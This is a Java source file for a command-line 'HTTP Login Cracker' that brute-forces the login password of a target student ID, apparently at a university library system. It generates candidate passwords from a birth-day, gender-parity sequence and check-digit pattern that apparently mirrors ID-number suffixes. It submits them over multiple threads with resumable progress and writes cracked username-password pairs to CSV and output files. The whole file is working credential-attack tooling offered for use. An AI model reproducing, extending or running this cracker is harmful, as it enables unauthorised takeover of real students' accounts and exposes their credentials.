package com.userzbb.cracker;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.Writer;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * HTTP Login Cracker - Main CLI entry point.
 * Ported from crack_login_http.py in UJN_lib_scaper.
 *
 * Usage:
 *   java -jar http-cracker.jar <username> [-g M|F|ALL] [-d day_spec] [-s max_seq]
 *                                      [-t threads] [-p performance] [-o output]
 *
 * Example:
 *   java -jar http-cracker.jar 2021001234 -g M -d 01-05 -s 500 -t 10
 */
public class HttpCracker {

    public static void main(String[] args) {
        if (args.length == 0) {
            printUsage();
            return;
        }

        String username = null;
        char gender = 'A'; // M, F, A (ALL)
        String daySpec = null; // null means default 01..31
        int maxSeq = 500;
        int threads = 5;
        String outputPath = null;

        // Parse arguments
        for (int i = 0; i < args.length; i++) {
            String a = args[i];
            if ("-g".equals(a) || "--gender".equals(a)) {
                if (i + 1 >= args.length) {
                    System.err.println("Missing value for " + a);
                    return;
                }
                gender = args[++i].toUpperCase().charAt(0);
                continue;
            }
            if ("-d".equals(a) || "--day".equals(a)) {
                if (i + 1 >= args.length) {
                    System.err.println("Missing value for " + a);
                    return;
                }
                daySpec = args[++i];
                continue;
            }
            if ("-s".equals(a) || "--max-seq".equals(a)) {
                if (i + 1 >= args.length) {
                    System.err.println("Missing value for " + a);
                    return;
                }
                maxSeq = Integer.parseInt(args[++i]);
                continue;
            }
            if ("-t".equals(a) || "--threads".equals(a)) {
                if (i + 1 >= args.length) {
                    System.err.println("Missing value for " + a);
                    return;
                }
                threads = Integer.parseInt(args[++i]);
                continue;
            }
            if ("-o".equals(a) || "--output".equals(a)) {
                if (i + 1 >= args.length) {
                    System.err.println("Missing value for " + a);
                    return;
                }
                outputPath = args[++i];
                continue;
            }
            if ("-h".equals(a) || "--help".equals(a)) {
                printUsage();
                return;
            }

            // First non-flag argument is username
            if (!a.startsWith("-") && username == null) {
                username = a;
                continue;
            }

            System.err.println("Unknown argument: " + a);
            printUsage();
            return;
        }

        if (username == null) {
            System.err.println("Username is required");
            printUsage();
            return;
        }

        try {
            runCracker(username, gender, daySpec, maxSeq, threads, outputPath);
        } catch (Exception e) {
            System.err.println("Error running cracker: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private static void runCracker(String username, char gender, String daySpec,
                                   int maxSeq, int threads, String outputPath) throws Exception {
        System.out.println("=== HTTP Login Cracker ===");
        System.out.println("Username: " + username);
        System.out.println("Gender: " + gender);
        System.out.println("Day spec: " + (daySpec == null ? "01-31" : daySpec));
        System.out.println("Max sequence: " + maxSeq);
        System.out.println("Threads: " + threads);
        System.out.println();

        // Initialize database
        DatabaseManager dbManager = new DatabaseManager(Config.DB_PATH);
        dbManager.startPeriodicFlush();

        // Check if password already found
        List<String> foundPasswords = dbManager.getFoundPasswords(username);
        if (!foundPasswords.isEmpty()) {
            System.out.println("[!] Password already found: " + foundPasswords.get(0));
            System.out.println("Exiting...");
            dbManager.close();
            return;
        }

        // Check resume status
        String resumePoint = dbManager.initializeProgress(username);
        ProgressTracker progressTracker = new ProgressTracker(username);
        if (resumePoint != null && !resumePoint.isEmpty()) {
            progressTracker.setResumePoint(resumePoint);
            System.out.println("[*] Resuming from: " + resumePoint);
        }

        // Generate password list
        List<String> passwords = generatePasswords(username, gender, daySpec, maxSeq);
        int totalPasswords = passwords.size();
        System.out.println("[*] Generated " + totalPasswords + " passwords to check");
        System.out.println("[*] Starting with " + threads + " worker threads...");
        System.out.println();

        // Print header for progress bar
        System.out.println("  0%" + " " + repeat(" ", 48) + "100%");
        System.out.println("  " + repeat("-", 50));

        // Track success count
        AtomicInteger successCount = new AtomicInteger(0);

        // Create thread pool
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        HttpWorker.setExecutor(executor);

        // Submit password checking tasks
        int submitted = 0;
        for (String password : passwords) {
            if (!progressTracker.isRunning()) {
                break; // Password found, stop submitting
            }

            // Skip passwords below high-water mark
            if (password.compareTo(progressTracker.getHighWaterMark()) <= 0) {
                continue;
            }

            HttpWorker worker = new HttpWorker(username, password, progressTracker, dbManager, successCount);
            executor.submit(worker);
            submitted++;
        }

        System.out.println();
        System.out.println("[*] Submitted " + submitted + " password checks");
        System.out.println("[*] Waiting for workers to complete...");

        // Wait for completion with periodic progress display
        try {
            executor.shutdown();
            int lastCount = 0;
            while (!executor.awaitTermination(2, TimeUnit.SECONDS)) {
                if (successCount.get() > 0) {
                    System.out.println("\n[*] Password found! Waiting for workers to finish...");
                    break;
                }
                // Update progress bar based on attempt count
                int current = progressTracker.getAttemptCount();
                if (current > lastCount) {
                    int percent = (current * 50) / totalPasswords;
                    System.out.print("\r  [" + repeat("#", percent) + repeat(" ", 50 - percent) + "] " + current + "/" + totalPasswords);
                    lastCount = current;
                    // Periodically save progress to database for resume
                    if (current % 50 == 0) {
                        try {
                            dbManager.updateProgress(username, progressTracker.getCurrentPassword(), current);
                        } catch (Exception e) {
                            // Ignore DB errors
                        }
                    }
                }
            }
            // Print final progress
            int finalCount = progressTracker.getAttemptCount();
            int percent = (finalCount * 50) / totalPasswords;
            System.out.print("\r  [" + repeat("#", percent) + repeat(" ", 50 - percent) + "] " + finalCount + "/" + totalPasswords);
            System.out.println();
        } catch (InterruptedException e) {
            // Don't call shutdownNow() - it can crash ONNX Runtime
            // Save progress before exiting
            try {
                dbManager.updateProgress(username, progressTracker.getCurrentPassword(), progressTracker.getAttemptCount());
                dbManager.flushProgress();
            } catch (Exception ex) {
                // Ignore
            }
            Thread.currentThread().interrupt();
        }

        // Flush remaining progress
        dbManager.flushProgress();

        // Update final status
        dbManager.updateProgress(username, progressTracker.getCurrentPassword(),
                                progressTracker.getAttemptCount());

        if (successCount.get() > 0) {
            dbManager.markComplete(username);
        }

        // Auto-save to found_passwords.csv when password is found
        if (successCount.get() > 0) {
            String csvPath = "found_passwords.csv";
            try (Writer writer = new BufferedWriter(new FileWriter(csvPath))) {
                writer.write("username,password,found_at\n");
                for (String pwd : dbManager.getFoundPasswords(username)) {
                    writer.write(username + "," + pwd + ",");
                    writer.write(java.time.LocalDateTime.now().toString() + "\n");
                }
                System.out.println("[+] Results saved to: " + csvPath);
            } catch (Exception e) {
                System.err.println("Failed to save CSV: " + e.getMessage());
            }
        }

        // Save results to output file if specified
        if (outputPath != null && successCount.get() > 0) {
            try (Writer writer = new BufferedWriter(new FileWriter(outputPath))) {
                for (String pwd : dbManager.getFoundPasswords(username)) {
                    writer.write(username + ":" + pwd + "\n");
                }
            }
            System.out.println("[*] Results saved to: " + outputPath);
        }

        System.out.println();
        System.out.println("=== Completed ===");
        System.out.println("Total attempts: " + progressTracker.getAttemptCount());
        System.out.println("Passwords found: " + successCount.get());

        dbManager.close();
    }

    /**
     * Generates password list based on DDSSSC format.
     * Mirrors the password generation from WordlistGenerator.
     */
    private static List<String> generatePasswords(String username, char gender,
                                                   String daySpec, int maxSeq) {
        List<String> passwords = new ArrayList<>();
        List<Integer> days = parseDaySpec(daySpec);

        for (int day : days) {
            String dayStr = String.format("%02d", day);

            for (int seq = 0; seq < maxSeq; seq++) {
                // Apply gender filter
                if (gender == 'M' && seq % 2 == 0) {
                    continue; // Males use odd sequence numbers
                }
                if (gender == 'F' && seq % 2 == 1) {
                    continue; // Females use even sequence numbers
                }

                String seqStr = String.format("%03d", seq);

                // Generate password with check digit (last digit of day + seq + check)
                for (int check = 0; check <= 9; check++) {
                    String password = dayStr + seqStr + check;
                    passwords.add(password);
                }
            }
        }

        return passwords;
    }

    static List<Integer> parseDaySpec(String spec) {
        List<Integer> days = new ArrayList<>();
        if (spec == null || spec.isBlank()) {
            for (int d = 1; d <= 31; d++) {
                days.add(d);
            }
            return days;
        }

        String[] parts = spec.split(",");
        for (String p : parts) {
            p = p.trim();
            if (p.contains("-")) {
                String[] mm = p.split("-", 2);
                int a = Integer.parseInt(mm[0]);
                int b = Integer.parseInt(mm[1]);
                if (a > b) {
                    int t = a;
                    a = b;
                    b = t;
                }
                for (int d = Math.max(1, a); d <= Math.min(31, b); d++) {
                    days.add(d);
                }
            } else {
                int v = Integer.parseInt(p);
                if (v >= 1 && v <= 31) {
                    days.add(v);
                }
            }
        }
        return days;
    }

    /**
     * Helper method to repeat a character N times
     */
    private static String repeat(String c, int count) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) {
            sb.append(c);
        }
        return sb.toString();
    }

    private static void printUsage() {
        System.out.println(
            "HTTP Login Cracker - Port from UJN_lib_scaper\n" +
            "\n" +
            "Usage: java -jar http-cracker.jar <username> [options]\n" +
            "\n" +
            "Arguments:\n" +
            "  username          Target username (student ID)\n" +
            "\n" +
            "Options:\n" +
            "  -g, --gender <M|F|ALL>  Gender filter (M=odd seq, F=even seq, ALL=both)\n" +
            "                         Default: ALL\n" +
            "  -d, --day <spec>        Day specification (01, 01-05, 01,03,05)\n" +
            "                         Default: 01-31\n" +
            "  -s, --max-seq <N>       Maximum sequence number (exclusive)\n" +
            "                         Default: 500\n" +
            "  -t, --threads <N>       Number of worker threads\n" +
            "                         Default: 5\n" +
            "  -o, --output <path>     Output file for found passwords\n" +
            "  -h, --help              Show this help message\n" +
            "\n" +
            "Example:\n" +
            "  java -jar http-cracker.jar 2021001234 -g M -d 01-05 -s 500 -t 10\n"
        );
    }
}
